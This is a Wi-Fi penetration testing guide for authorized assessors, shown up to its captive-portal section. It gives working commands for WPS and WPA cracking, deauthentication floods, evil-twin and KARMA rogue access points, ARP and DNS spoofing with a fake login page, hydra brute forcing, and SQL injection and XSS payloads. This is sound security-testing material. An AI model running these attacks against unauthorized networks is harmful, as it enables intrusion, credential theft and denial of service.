# 📡 Wi-Fi VAPT – Complete Testing Guide
> **Audience:** Security testers performing authorized Wi-Fi Vulnerability Assessment & Penetration Testing (VAPT)  
> **Scope:** 1 Access Point + Multiple Endpoint IPs  
> **Legal Notice:** Only perform these tests on networks you have **written authorization** to test. Unauthorized testing is illegal.

---

## 🗂️ Table of Contents

1. [Pre-Engagement Checklist](#1-pre-engagement-checklist)
2. [Lab & Tool Setup](#2-lab--tool-setup)
3. [TC-01 – Reconnaissance & AP Discovery](#tc-01--reconnaissance--ap-discovery)
4. [TC-02 – SSID & Broadcast Analysis](#tc-02--ssid--broadcast-analysis)
5. [TC-03 – WPS Vulnerability Testing (Reaver / Bully)](#tc-03--wps-vulnerability-testing)
6. [TC-04 – WPA/WPA2 Handshake Capture](#tc-04--wpawpa2-handshake-capture)
7. [TC-05 – Dictionary / Brute-Force Attack (Aircrack-ng)](#tc-05--dictionary--brute-force-attack)
8. [TC-06 – PMKID Attack (Hashcat / hcxtools)](#tc-06--pmkid-attack)
9. [TC-07 – Deauthentication (DoS) Attack](#tc-07--deauthentication-dos-attack)
10. [TC-08 – Evil Twin / Rogue AP Attack](#tc-08--evil-twin--rogue-ap-attack)
11. [TC-09 – KARMA / Probe Request Harvesting](#tc-09--karma--probe-request-harvesting)
12. [TC-10 – Man-in-the-Middle (MiTM) over Wi-Fi](#tc-10--man-in-the-middle-mitm-over-wi-fi)
13. [TC-11 – ARP Poisoning on the Wireless Segment](#tc-11--arp-poisoning-on-the-wireless-segment)
14. [TC-12 – DNS Spoofing After MiTM](#tc-12--dns-spoofing-after-mitm)
15. [TC-13 – Endpoint Scanning (Nmap)](#tc-13--endpoint-scanning-nmap)
16. [TC-14 – Service & Vulnerability Enumeration](#tc-14--service--vulnerability-enumeration)
17. [TC-15 – Captive Portal / Web Interface Testing](#tc-15--captive-portal--web-interface-testing)
18. [TC-16 – Default Credentials Check on AP Admin Panel](#tc-16--default-credentials-check-on-ap-admin-panel)
19. [TC-17 – Wireless Isolation & Client-to-Client Traffic Test](#tc-17--wireless-isolation--client-to-client-traffic-test)
20. [TC-18 – VLAN Hopping (if VLANs present)](#tc-18--vlan-hopping)
21. [TC-19 – SSL/TLS Traffic Inspection](#tc-19--ssltls-traffic-inspection)
22. [TC-20 – WPA3 / OWE Downgrade Test](#tc-20--wpa3--owe-downgrade-test)
23. [Post-Testing Cleanup](#post-testing-cleanup)
24. [Reporting Template Summary](#reporting-template-summary)
25. [Quick Reference Risk Matrix](#quick-reference-risk-matrix)

---

## 1. Pre-Engagement Checklist

Before you touch a single tool, confirm the following with your client:

```
[ ] Written authorization / Scope of Work document signed
[ ] Target SSID(s) and BSSID(s) listed in scope
[ ] Target endpoint IP addresses provided
[ ] Testing window agreed (time & date)
[ ] Emergency contact number of network admin
[ ] Rules of engagement: what is off-limits?
[ ] Your tester laptop MAC address whitelisted (if needed)
[ ] Backup/snapshot of AP config taken by client
```

> ⚠️ **Why:** Without this, you are committing a crime. With it, you are a professional.

---

## 2. Lab & Tool Setup

### 2.1 Recommended OS
Use **Kali Linux** (2023+) or **Parrot OS** – they come with all tools pre-installed.

### 2.2 Hardware Required
- Wireless adapter that supports **monitor mode** and **packet injection**
  - Recommended: **Alfa AWUS036ACH** (AC1200, dual-band) or **AWUS036NHA**

### 2.3 Verify Monitor Mode Support
```bash
# Check your wireless interface name
ip link show
# OR
iwconfig

# Verify it supports monitor mode
iw list | grep -A 10 "Supported interface modes"
```
**Expected output:** You should see `monitor` listed in supported modes.

### 2.4 Install / Update All Tools
```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y aircrack-ng reaver bully hcxtools hcxdumptool hashcat \
  wireshark tshark nmap nikto ettercap-text-only bettercap mdk4 \
  hostapd dnsmasq python3-pip macchanger net-tools
pip3 install scapy
```

### 2.5 Identify Your Interface
```bash
# List wireless interfaces
iwconfig
# Common names: wlan0, wlan1, wlp2s0
# We'll use IFACE=wlan0 throughout this guide – replace with yours
export IFACE=wlan0
```

---

## TC-01 – Reconnaissance & AP Discovery

### 🎯 Objective
Identify the target Access Point — its BSSID (MAC), channel, signal strength, encryption type, and connected clients.

### ❓ Why We Do This
Before any attack, we need accurate target identification. Wrong BSSID = testing the wrong AP = legal trouble + wasted time.

### Step 1 – Enable Monitor Mode
```bash
sudo airmon-ng check kill       # Kill interfering processes
sudo airmon-ng start wlan0      # Start monitor mode
# Your interface is now typically renamed: wlan0mon
iwconfig                        # Confirm — look for Mode: Monitor
export MON=wlan0mon
```

> **If `airmon-ng` doesn't work:**
> ```bash
> sudo ip link set wlan0 down
> sudo iw dev wlan0 set type monitor
> sudo ip link set wlan0 up
> export MON=wlan0
> ```

### Step 2 – Scan All APs
```bash
sudo airodump-ng $MON
```

**Expected Output:**
```
BSSID              PWR  Beacons  #Data  CH  MB   ENC  CIPHER AUTH ESSID
AA:BB:CC:DD:EE:FF  -55  120      45     6   130  WPA2 CCMP   PSK  TargetWiFi
```

**What to note:**
| Field | Meaning |
|-------|---------|
| BSSID | AP's MAC address – your primary target identifier |
| CH | Channel the AP is operating on |
| ENC | Encryption type (WEP/WPA/WPA2/WPA3) |
| CIPHER | CCMP (AES) is strong; TKIP is weaker |
| AUTH | PSK = Pre-Shared Key; MGT = Enterprise (RADIUS) |
| ESSID | The Wi-Fi name (SSID) |
| PWR | Signal strength (closer to 0 = stronger) |

### Step 3 – Lock onto Target and Save
```bash
# Replace with your actual values
export BSSID="AA:BB:CC:DD:EE:FF"
export CH=6
export SSID="TargetWiFi"

sudo airodump-ng --bssid $BSSID --channel $CH --write tc01_recon $MON
```

**Expected Output:** A focused view showing only your target AP and its connected clients (bottom section).

### ✅ Vulnerability Indicators
| Finding | Risk |
|---------|------|
| ENC = WEP | 🔴 CRITICAL – crackable in minutes |
| ENC = WPA with TKIP cipher | 🟠 HIGH – vulnerable to TKIP attacks |
| ENC = WPA2 with CCMP | 🟡 MEDIUM – depends on password strength |
| ENC = WPA3 | 🟢 LOW – strong, but check for downgrade |
| AUTH = MGT (Enterprise) | 🟢 LOW – better than PSK, check cert validation |
| Multiple clients visible | ℹ️ Note all client MACs for later steps |

---

## TC-02 – SSID & Broadcast Analysis

### 🎯 Objective
Check if the SSID is hidden, if multiple SSIDs exist on the same AP, and analyze beacon frames.

### ❓ Why We Do This
Hidden SSIDs give a false sense of security. APs often broadcast management SSIDs or secondary networks that expand the attack surface.

### Step 1 – Look for Hidden SSIDs
```bash
sudo airodump-ng $MON
# Look for rows where ESSID shows: <length: X> — these are hidden SSIDs
```

### Step 2 – Uncloak Hidden SSID
When a client connects to a hidden SSID, the SSID is revealed in probe requests/responses.

```bash
# Send a deauth to force client to re-probe (reveals hidden SSID)
# Get CLIENT_MAC from the bottom section of airodump-ng output
export CLIENT_MAC="11:22:33:44:55:66"
sudo aireplay-ng --deauth 5 -a $BSSID -c $CLIENT_MAC $MON
# Watch airodump-ng — ESSID will appear when client reconnects
```

### Step 3 – Capture and Analyze Beacon Frames in Wireshark
```bash
# Capture beacon frames to a file
sudo tshark -i $MON -Y "wlan.fc.type_subtype == 0x08" \
  -w tc02_beacons.pcap

# Read the file and show SSIDs
tshark -r tc02_beacons.pcap -Y "wlan.fc.type_subtype == 0x08" \
  -T fields -e wlan.sa -e wlan_mgt.ssid | sort -u
```

### ✅ Vulnerability Indicators
| Finding | Risk |
|---------|------|
| Hidden SSID (security through obscurity) | 🟡 LOW – trivially uncloaked |
| Multiple SSIDs (guest + corp on same AP) | 🟠 HIGH – check if traffic is isolated |
| Management SSID broadcasting | 🟡 MEDIUM – may expose admin interface |

---

## TC-03 – WPS Vulnerability Testing

### 🎯 Objective
Test if Wi-Fi Protected Setup (WPS) is enabled and exploitable via the Pixie Dust attack or brute-force PIN attack.

### ❓ Why We Do This
WPS has a design flaw: the 8-digit PIN is actually two 4-digit halves checked separately, reducing the search space from 100,000,000 to ~11,000 combinations. Pixie Dust can crack WPS offline in seconds.

### Step 1 – Check if WPS is Enabled
```bash
sudo wash -i $MON
# OR
sudo wash -i $MON --ignore-fcs
```

**Expected Output:**
```
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
AA:BB:CC:DD:EE:FF    6  -55  2.0  No   Routerb.  TargetWiFi
```

**Lck = Yes** means WPS is locked (it detected brute-force). **Lck = No** means it's open to attack.

### Step 2 – Pixie Dust Attack (Fast – Offline)
```bash
sudo reaver -i $MON -b $BSSID -c $CH -K 1 -vv
# -K 1 enables Pixie Dust attack
# -vv = very verbose
```

**Expected Outputs:**

*Vulnerable (CRITICAL):*
```
[+] WPS PIN: '12345670'
[+] WPA PSK: 'password123'
[+] AP SSID: 'TargetWiFi'
```

*Not vulnerable to Pixie Dust:*
```
[!] WARNING: Sending WPS NACK
[Pixie-Dust] Attack failed. Trying online attack...
```

### Step 3 – Online PIN Brute Force (Slower)
```bash
sudo reaver -i $MON -b $BSSID -c $CH -vv \
  --delay=1 --lock-delay=60 --max-attempts=3
# --delay: seconds between attempts (avoid lockout)
# --lock-delay: wait time after lockout detected
```

**Alternative tool:**
```bash
sudo bully $MON -b $BSSID -c $CH -v 3
```

### ✅ Vulnerability Indicators
| Finding | Risk |
|---------|------|
| WPS not enabled | 🟢 SECURE |
| WPS enabled, Lck=Yes | 🟡 MEDIUM – lockout in place, but WPS still a risk |
| WPS enabled, Pixie Dust success | 🔴 CRITICAL – full password exposed in seconds |
| WPS enabled, PIN brute-forceable | 🔴 HIGH – password exposed |

**Recommendation if vulnerable:** Disable WPS entirely on the AP.

---

## TC-04 – WPA/WPA2 Handshake Capture

### 🎯 Objective
Capture the 4-way WPA/WPA2 handshake between a client and the AP. This handshake contains a hash of the password that can be cracked offline.

### ❓ Why We Do This
Once captured, the handshake can be taken home and cracked using dictionary or brute-force attacks without touching the live network again.

### Step 1 – Start Targeted Capture
```bash
sudo airodump-ng --bssid $BSSID --channel $CH \
  --write tc04_handshake $MON
# Let this run in Terminal 1 — keep it open!
```

### Step 2 – Force Handshake via Deauthentication
Open a **second terminal** and run:
```bash
# Deauth ALL clients from the AP (use specific client MAC to be less disruptive)
sudo aireplay-ng --deauth 10 -a $BSSID $MON

# OR target a specific client (better practice)
sudo aireplay-ng --deauth 10 -a $BSSID -c $CLIENT_MAC $MON
```

**What happens:** Clients are disconnected and immediately reconnect. During reconnection, the 4-way handshake occurs.

### Step 3 – Confirm Handshake Captured
Watch Terminal 1 (airodump-ng). In the top-right corner you will see:
```
WPA handshake: AA:BB:CC:DD:EE:FF
```
This confirms the handshake is captured. Press `Ctrl+C` to stop.

**Files created:**
- `tc04_handshake-01.cap` — the capture file
- `tc04_handshake-01.csv` — metadata

### Step 4 – Verify Handshake Integrity
```bash
sudo aircrack-ng tc04_handshake-01.cap
# If it shows "1 handshake" — you're ready to crack
```

### ✅ Vulnerability Indicators
| Finding | Risk |
|---------|------|
| Handshake NOT captured (no clients connected) | ℹ️ INFO – no active clients during test window |
| Handshake captured | 🟠 HIGH – password strength is now the only defense |
| AP uses WPA with TKIP | 🟠 HIGH – additionally vulnerable to TKIP attacks |
| AP uses WPA2 with CCMP | 🟡 MEDIUM – only as secure as the password |

---

## TC-05 – Dictionary / Brute-Force Attack

### 🎯 Objective
Attempt to crack the captured WPA handshake using a wordlist (dictionary attack).

### ❓ Why We Do This
Weak or common passwords are cracked in seconds. A successful crack proves the network is accessible to any attacker who captures the handshake.

### Step 1 – Prepare Wordlists
```bash
# Kali built-in wordlist (14 million passwords):
ls /usr/share/wordlists/rockyou.txt.gz
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Download additional wordlists:
# SecLists (great collection):
sudo apt install seclists
ls /usr/share/seclists/Passwords/
```

### Step 2 – Run Dictionary Attack
```bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  -b $BSSID tc04_handshake-01.cap
```

**Expected Output (Password Found):**
```
                                 Aircrack-ng 1.7

      [00:00:05] 8432/9822768 keys tested (1692.11 k/s)

      Time left: 1 hour, 36 minutes, 20 seconds                          0.09%

                           KEY FOUND! [ password123 ]


      Master Key     : A1 B2 C3 D4 ...
      Transient Key  : ...
```

**Expected Output (Not Found):**
```
Passphrase not in dictionary
```

### Step 3 – GPU-Accelerated Cracking with Hashcat (Much Faster)
```bash
# Convert cap file to hccapx format
cap2hccapx tc04_handshake-01.cap tc04_handshake.hccapx

# Run Hashcat (mode 2500 = WPA/WPA2)
hashcat -m 2500 tc04_handshake.hccapx /usr/share/wordlists/rockyou.txt \
  --force -O

# Show result
hashcat -m 2500 tc04_handshake.hccapx --show
```

### Step 4 – Rule-Based Attack (More Powerful)
```bash
# Use rules to mutate wordlist (add numbers, caps, symbols, etc.)
hashcat -m 2500 tc04_handshake.hccapx /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --force -O

# Try common pattern: word + 4 digits
hashcat -m 2500 tc04_handshake.hccapx -a 6 \
  /usr/share/wordlists/rockyou.txt ?d?d?d?d --force -O
```

### ✅ Vulnerability Indicators
| Finding | Risk |
|---------|------|
| Password found in rockyou.txt | 🔴 CRITICAL – extremely weak password |
| Password found with rules | 🔴 HIGH – weak password pattern |
| Password NOT found in any wordlist | 🟢 GOOD – but not conclusive, just indicates stronger password |

**Recommendation if cracked:** Enforce minimum 12-character passwords with mixed character types. Consider WPA3 migration.

---

## TC-06 – PMKID Attack

### 🎯 Objective
Capture the PMKID from the AP **without needing any connected clients** and crack it offline. This is more stealthy than TC-04.

### ❓ Why We Do This
Modern APs include the PMKID in the first EAPOL frame. You can request this directly from the AP — no client deauth needed, no disruption to users.

### Step 1 – Capture PMKID with hcxdumptool
```bash
# Create a target file with just your AP's BSSID (remove colons, uppercase)
echo "AABBCCDDEEFF" > target.txt

# Capture PMKID (run for 60–120 seconds)
sudo hcxdumptool -i $MON -o tc06_pmkid.pcapng \
  --enable_status=1 --filterlist_ap=target.txt --filtermode=2
# Press Ctrl+C after you see "PMKID" in output
```

**Expected Console Output:**
```
[09:45:12 - 002] 11 EAPOL (M1) frames written to pcapng file
[09:45:12 - 002] PMKID: AA12BB34CC56DD78EE90FF...
```

### Step 2 – Convert to Hashcat Format
```bash
hcxpcapngtool -o tc06_pmkid.hc22000 tc06_pmkid.pcapng
# OR older format:
hcxpcapngtool -o tc06_pmkid.hccapx tc06_pmkid.pcapng --hccapx
```

### Step 3 – Crack with Hashcat
```bash
# Mode 22000 = WPA2 (PMKID + EAPOL combined)
hashcat -m 22000 tc06_pmkid.hc22000 /usr/share/wordlists/rockyou.txt \
  --force -O

hashcat -m 22000 tc06_pmkid.hc22000 --show
```

### ✅ Vulnerability Indicators
| Finding | Risk |
|---------|------|
| PMKID captured and password cracked | 🔴 CRITICAL – no clients required to attack |
| PMKID captured but password not cracked | 🟡 MEDIUM – password strength holds (for now) |
| PMKID not captured (AP doesn't broadcast it) | 🟢 LOWER RISK – use handshake method instead |

---

## TC-07 – Deauthentication (DoS) Attack

### 🎯 Objective
Test whether the AP is vulnerable to 802.11 deauthentication flooding — a Denial of Service attack that kicks all clients off the network.

### ❓ Why We Do This
Management frames (including deauth) are unencrypted and unauthenticated in WPA2. Any attacker nearby can permanently kick all clients off the network. WPA3 with Management Frame Protection (MFP) fixes this.

### Step 1 – Targeted Deauth (Single Client)
```bash
# This is less disruptive — only affects one client
sudo aireplay-ng --deauth 0 -a $BSSID -c $CLIENT_MAC $MON
# --deauth 0 = continuous (Ctrl+C to stop)
# --deauth 100 = send 100 packets only
```

### Step 2 – Broadcast Deauth (All Clients)
```bash
# This kicks EVERYONE off the AP
sudo aireplay-ng --deauth 20 -a $BSSID $MON
```

### Step 3 – Advanced DoS with MDK4
```bash
# Authentication flood (exhausts AP's client table)
sudo mdk4 $MON a -a $BSSID

# Deauth flood with random source MACs
sudo mdk4 $MON d -B $BSSID
```

### Step 4 – Check for Management Frame Protection (MFP/PMF)
```bash
# Scan the AP and look for RSN (Robust Security Network) capabilities
sudo tshark -i $MON -Y "wlan.bssid == $BSSID && wlan.fc.type_subtype == 0x08" \
  -T fields -e wlan_mgt.rsn.capabilities.mfpc \
  -e wlan_mgt.rsn.capabilities.mfpr -c 10
# mfpc=1 = MFP capable, mfpr=1 = MFP required
```

### ✅ Vulnerability Indicators
| Finding | Risk |
|---------|------|
| Clients successfully deauthed (WPA2, no MFP) | 🟠 HIGH – DoS possible by any nearby attacker |
| AP has MFP required (WPA3 or WPA2+PMF) | 🟢 SECURE – management frames are protected |
| AP has MFP capable but not required | 🟡 MEDIUM – mixed environment, some clients still vulnerable |

---

## TC-08 – Evil Twin / Rogue AP Attack

### 🎯 Objective
Create a rogue AP with the same SSID as the target to capture client credentials or traffic when clients connect to your fake AP instead.

### ❓ Why We Do This
Tests whether users/devices will auto-connect to a rogue AP with the same name — exposing their traffic and potentially their credentials.

### Step 1 – Set Up Rogue AP with hostapd
```bash
# Install required packages
sudo apt install hostapd dnsmasq -y

# Create hostapd config
cat > /tmp/rogue_ap.conf << EOF
interface=$IFACE
driver=nl80211
ssid=$SSID
channel=$CH
hw_mode=g
ignore_broadcast_ssid=0
EOF

# Start rogue AP
sudo hostapd /tmp/rogue_ap.conf
```

### Step 2 – Add DHCP with dnsmasq
```bash
# Assign IP to your rogue AP interface
sudo ip addr add 192.168.50.1/24 dev $IFACE
sudo ip link set $IFACE up

# Configure dnsmasq
cat > /tmp/rogue_dnsmasq.conf << EOF
interface=$IFACE
dhcp-range=192.168.50.10,192.168.50.100,12h
dhcp-option=3,192.168.50.1
dhcp-option=6,192.168.50.1
EOF

sudo dnsmasq -C /tmp/rogue_dnsmasq.conf --no-daemon
```

### Step 3 – Automated Evil Twin with Bettercap
```bash
sudo bettercap -iface $IFACE

# In bettercap prompt:
wifi.recon on
set wifi.ap.ssid TargetWiFi
set wifi.ap.channel 6
wifi.ap on
```

### Step 4 – Force Clients to Your AP (Deauth legitimate AP)
```bash
# In a separate terminal — deauth clients from real AP
sudo aireplay-ng --deauth 0 -a $BSSID $MON
# Clients will search for the SSID and find yours
```

### Step 5 – Capture Credentials from Connected Clients
```bash
# Once a client connects to your rogue AP, capture their traffic
sudo tcpdump -i $IFACE -w tc08_evil_twin.pcap
```

### ✅ Vulnerability Indicators
| Finding | Risk |
|---------|------|
| Devices auto-connect to open rogue AP | 🔴 CRITICAL – no user awareness, traffic fully exposed |
| Devices prompt user before connecting | 🟡 MEDIUM – relies on user vigilance |
| Devices reject rogue AP (cert pinning / 802.1X) | 🟢 SECURE |
| Users enter credentials on captive portal | 🔴 CRITICAL – credential theft possible |

---

## TC-09 – KARMA / Probe Request Harvesting

### 🎯 Objective
Capture probe requests from client devices to discover which SSIDs they have previously connected to (their "preferred network list").

### ❓ Why We Do This
Mobile devices constantly broadcast probe requests for known networks. An attacker can see all the SSIDs a device trusts, then impersonate any of them.

### Step 1 – Capture Probe Requests
```bash
sudo tshark -i $MON -Y "wlan.fc.type_subtype == 0x04" \
  -T fields -e wlan.sa -e wlan_mgt.ssid \
  | grep -v "^$" | sort -u | tee tc09_probes.txt
```

**Expected Output:**
```
aa:bb:cc:11:22:33    HomeNetwork
aa:bb:cc:11:22:33    CoffeeShop_WiFi
aa:bb:cc:11:22:33    iPhone Hotspot
dd:ee:ff:44:55:66    Office_WiFi
dd:ee:ff:44:55:66    Marriott_Guest
```

### Step 2 – KARMA Attack with Bettercap (responds to ALL probes)
```bash
sudo bettercap -iface $IFACE

# In bettercap:
wifi.recon on
# Enable KARMA — respond to ANY probe request claiming to be that SSID
set wifi.ap.karma true
wifi.ap on
```

### ✅ Vulnerability Indicators
| Finding | Risk |
|---------|------|
| Devices send directed probe requests | 🟠 HIGH – preferred network list is exposed |
| Devices accept KARMA response and connect | 🔴 CRITICAL – auto-connect to rogue AP |
| Devices only send broadcast probes (not directed) | 🟡 LOWER – modern iOS/Android default |

---

## TC-10 – Man-in-the-Middle (MiTM) over Wi-Fi

### 🎯 Objective
After connecting to the same network as targets (or via evil twin), intercept and inspect their traffic.

### ❓ Why We Do This
Validates whether sensitive data (credentials, session tokens, API keys) is transmitted over unencrypted channels.

### Step 1 – Connect to the Target Wi-Fi
```bash
# Stop monitor mode first
sudo airmon-ng stop $MON
# Connect normally to the target WiFi via wpa_supplicant or Network Manager
```

### Step 2 – Enable IP Forwarding
```bash
sudo sysctl -w net.ipv4.ip_forward=1
# Make permanent:
echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
```

### Step 3 – Run Bettercap MiTM
```bash
sudo bettercap -iface $IFACE

# Inside bettercap console:
net.probe on                    # Discover hosts
net.show                        # List discovered hosts
set arp.spoof.targets 192.168.1.105,192.168.1.110  # Target endpoint IPs
arp.spoof on                    # Start ARP poisoning
net.sniff on                    # Start sniffing

# Enable HTTP sniffer for credentials:
set http.proxy.sslstrip true
http.proxy on
```

### Step 4 – Capture Full Traffic with Wireshark
```bash
sudo wireshark -i $IFACE -k
# Filter for HTTP: http
# Filter for credentials: http contains "password" or http contains "login"
# Filter for DNS: dns
```

### ✅ Vulnerability Indicators
| Finding | Risk |
|---------|------|
| HTTP credentials captured in plaintext | 🔴 CRITICAL – credentials stolen |
| Session cookies intercepted | 🔴 HIGH – session hijacking possible |
| All traffic encrypted (HTTPS/TLS) | 🟢 GOOD – but check for SSLstrip success |
| SSLstrip successfully downgrades HTTPS to HTTP | 🔴 CRITICAL – HSTS not enforced |

---

## TC-11 – ARP Poisoning on the Wireless Segment

### 🎯 Objective
Send forged ARP replies to target endpoints, associating your MAC with the gateway IP — redirecting their traffic through you.

### ❓ Why We Do This
ARP has no authentication. Any device on the same L2 segment can impersonate the gateway. This is the foundation of most wireless MiTM attacks.

### Step 1 – Discover the Gateway and Target IPs
```bash
# Find your IP and gateway
ip route show
# Identify gateway: e.g., 192.168.1.1

# Scan for active hosts
sudo nmap -sn 192.168.1.0/24 | grep "Nmap scan report"
export GW="192.168.1.1"
export TARGET="192.168.1.105"
```

### Step 2 – ARP Poison with Arpspoof
```bash
# Terminal 1: Poison TARGET's ARP cache (tell target: gateway IP = my MAC)
sudo arpspoof -i $IFACE -t $TARGET $GW

# Terminal 2: Poison GATEWAY's ARP cache (tell gateway: target IP = my MAC)
sudo arpspoof -i $IFACE -t $GW $TARGET
```

### Step 3 – ARP Poison with Bettercap (easier)
```bash
sudo bettercap -iface $IFACE
# In console:
net.probe on
set arp.spoof.targets $TARGET
arp.spoof on
net.sniff on
```

### Step 4 – Verify Attack is Working
```bash
# On the target machine (or via your traffic capture), run:
arp -a
# You should see the gateway IP mapped to YOUR MAC address — attack confirmed
```

### ✅ Vulnerability Indicators
| Finding | Risk |
|---------|------|
| ARP cache poisoned successfully | 🔴 HIGH – all target traffic routable through attacker |
| Dynamic ARP Inspection (DAI) blocks attack | 🟢 SECURE – enterprise switch control |
| Static ARP entries prevent poisoning | 🟢 SECURE – but impractical at scale |

---

## TC-12 – DNS Spoofing After MiTM

### 🎯 Objective
After establishing MiTM position, intercept DNS queries and respond with malicious IP addresses — redirecting victims to attacker-controlled sites.

### ❓ Why We Do This
DNS spoofing allows redirection of any domain to a phishing page, enabling credential harvesting at scale.

### Step 1 – DNS Spoofing with Bettercap
```bash
sudo bettercap -iface $IFACE

# First establish MiTM (from TC-10/TC-11)
arp.spoof on

# Set DNS spoof targets
set dns.spoof.domains target-company.com,mail.target-company.com
set dns.spoof.address 192.168.1.200   # Your machine's IP
dns.spoof on
```

### Step 2 – Host a Fake Login Page
```bash
# Simple Python HTTP server
mkdir /tmp/phish && cd /tmp/phish
cat > index.html << 'EOF'
<html><body>
<h2>Corporate Login</h2>
<form method="POST" action="/capture">
  Username: <input name="user"><br>
  Password: <input name="pass" type="password"><br>
  <input type="submit" value="Login">
</form>
</body></html>
EOF
sudo python3 -m http.server 80
```

### Step 3 – Verify DNS Spoofing
```bash
# On the victim machine, resolve the domain:
nslookup target-company.com
# Should return your attacker IP instead of the real one
```

### ✅ Vulnerability Indicators
| Finding | Risk |
|---------|------|
| DNS responses spoofed successfully | 🔴 CRITICAL – full traffic redirection |
| DNSSEC validation fails/bypassed | 🔴 HIGH |
| DNSSEC blocks spoofing | 🟢 SECURE |
| HTTPS with HSTS prevents phishing page loading | 🟢 GOOD – but warn users anyway |

---

## TC-13 – Endpoint Scanning (Nmap)

### 🎯 Objective
Enumerate all provided endpoint IPs for open ports, running services, and OS fingerprints.

### ❓ Why We Do This
Open ports = attack surface. Every unnecessary open port is a potential entry point.

### Step 1 – Quick Host Discovery
```bash
# Replace with your actual endpoint IP range/list
export ENDPOINTS="192.168.1.100,192.168.1.105,192.168.1.110"

sudo nmap -sn $ENDPOINTS -oN tc13_hosts.txt
```

### Step 2 – Full Port Scan
```bash
# Scan all 65535 ports on all endpoints
sudo nmap -p- -T4 $ENDPOINTS -oN tc13_fullscan.txt
```

### Step 3 – Service & Version Detection
```bash
sudo nmap -sV -sC -p- $ENDPOINTS -oN tc13_services.txt
# -sV = version detection
# -sC = run default scripts (basic vuln checks)
```

### Step 4 – OS Detection
```bash
sudo nmap -O $ENDPOINTS -oN tc13_os.txt
```

### Step 5 – Vulnerability Scan Scripts
```bash
sudo nmap --script vuln $ENDPOINTS -oN tc13_vulns.txt

# Specific useful scripts:
sudo nmap --script smb-vuln* -p 445 $ENDPOINTS
sudo nmap --script http-title,http-headers -p 80,443,8080,8443 $ENDPOINTS
sudo nmap --script ssh-auth-methods -p 22 $ENDPOINTS
```

### Step 6 – UDP Scan (Often Forgotten!)
```bash
sudo nmap -sU --top-ports 200 $ENDPOINTS -oN tc13_udp.txt
# Important UDP ports: 53(DNS), 67(DHCP), 69(TFTP), 161(SNMP), 514(Syslog)
```

### ✅ Vulnerability Indicators
| Port/Service | Risk |
|-------------|------|
| 21 (FTP) open | 🔴 HIGH – check for anonymous login, unencrypted |
| 23 (Telnet) open | 🔴 CRITICAL – plaintext remote access |
| 80 (HTTP) open | 🟠 MEDIUM – check for sensitive data over HTTP |
| 161 (SNMP) open | 🟠 HIGH – check for default community strings |
| 445 (SMB) open | 🟠 HIGH – check for EternalBlue, null sessions |
| 3389 (RDP) open | 🟠 HIGH – brute-force target |
| 22 (SSH) open | 🟡 MEDIUM – check for weak credentials |
| Minimal ports open (22 or nothing) | 🟢 GOOD |

---

## TC-14 – Service & Vulnerability Enumeration

### 🎯 Objective
Deep-dive into each discovered service to identify misconfigurations, default credentials, and known CVEs.

### Step 1 – SNMP Enumeration (Port 161)
```bash
# Check for default community strings
sudo nmap -sU -p 161 --script snmp-brute $ENDPOINTS

# Enumerate SNMP if community string found
snmpwalk -v2c -c public $TARGET_IP
snmpwalk -v2c -c private $TARGET_IP

# Common info leaked:
# System info, network interfaces, running processes, installed software
```

### Step 2 – HTTP/HTTPS Enumeration
```bash
# Nikto web scanner
nikto -h http://$TARGET_IP -o tc14_nikto.txt

# Directory brute-force
gobuster dir -u http://$TARGET_IP \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -o tc14_dirs.txt

# Check for admin panels:
curl -v http://$TARGET_IP/admin
curl -v http://$TARGET_IP/management
curl -v http://$TARGET_IP/router
```

### Step 3 – SMB Enumeration (Port 445)
```bash
# Enumerate shares
smbclient -L //$TARGET_IP -N

# Check for null session
smbclient //$TARGET_IP/SHARE -N

# Vulnerability check
sudo nmap --script smb-vuln-ms17-010 -p 445 $TARGET_IP
```

### Step 4 – SSH Enumeration (Port 22)
```bash
# Check supported auth methods
sudo nmap --script ssh-auth-methods -p 22 $TARGET_IP

# Check SSH version (old versions = vulnerable)
ssh -v $TARGET_IP 2>&1 | grep "SSH"

# Try default credentials
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET_IP ssh
```

### Step 5 – FTP Enumeration (Port 21)
```bash
# Check for anonymous login
ftp $TARGET_IP
# Username: anonymous
# Password: (just press enter)

# Nmap script
sudo nmap --script ftp-anon,ftp-bounce -p 21 $TARGET_IP
```

### ✅ Vulnerability Indicators
| Finding | Risk |
|---------|------|
| SNMP with "public"/"private" community string | 🔴 HIGH – full device enumeration |
| FTP anonymous login allowed | 🔴 HIGH |
| SMB null session allowed | 🔴 HIGH |
| SSH with default credentials | 🔴 CRITICAL |
| EternalBlue (MS17-010) vulnerable | 🔴 CRITICAL – remote code execution |
| Outdated software versions | 🟠 HIGH – check CVE databases |

---

## TC-15 – Captive Portal / Web Interface Testing

### 🎯 Objective
If the AP has a captive portal or web admin interface, test it for web vulnerabilities.

### Step 1 – Access the AP Admin Interface
```bash
# Common AP admin URLs:
curl http://192.168.1.1
curl http://192.168.0.1
curl http://10.0.0.1

# Check response headers
curl -v http://192.168.1.1 2>&1 | head -50
```

### Step 2 – Test for Default Credentials
```bash
# Common default credential combinations
# admin/admin, admin/password, admin/(blank), root/root
# admin/1234, user/user, admin/router model name

# Automated test:
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.1.1 http-get /

# For HTTP form:
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.1.1 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

### Step 3 – SQL Injection Test
```bash
# Manual test in login form:
# Username: admin' --
# Username: ' OR '1'='1
# Username: admin'/*

# Automated:
sqlmap -u "http://192.168.1.1/login" \
  --data="username=admin&password=test" --level=3
```

### Step 4 – XSS Test
```bash
# In any input field:
# <script>alert(1)</script>
# "><img src=x onerror=alert(1)>

# If the AP has any user-visible pages, test all fields
```

### Step 5 – CSRF Test
```bash
# Check if forms have CSRF tokens
curl -v -b "session=TOKEN" http://192.168.1.1/settings/change_password
# If state-changing actions work without CSRF token = vulnerable
```

### ✅ Vulnerability Indicators
| Finding | Risk |
|---------|------|
| Default credentials work | 🔴 CRITICAL – full AP control |
| No rate limiting on login | 🟠 HIGH – brute force possible |
